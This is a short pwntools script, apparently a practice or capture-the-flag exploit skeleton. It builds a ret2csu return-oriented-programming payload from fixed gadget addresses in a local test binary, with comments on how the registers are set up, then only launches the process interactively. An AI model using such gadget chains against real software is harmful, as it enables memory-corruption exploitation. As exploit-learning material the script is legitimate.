from pwn import *
ELF_name = 'test_open'
elf = context.binary = ELF(ELF_name)
#write_got = elf.symbols['read']

libc = ELF( './libc.so.6')
context.terminal = ["tmux","splitw","-w"]
context.log_level = "info"
gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    else:
        return process(elf.path)
def interactive():
    io.interactive()

csu_front_addr = 0x4005d0
csu_end_addr = 0x4005e6

def csu(rbx,rbp,r12,r13,r14,r15,last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload =  p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(csu_front_addr)
    return payload

io = start()
io.interactive()
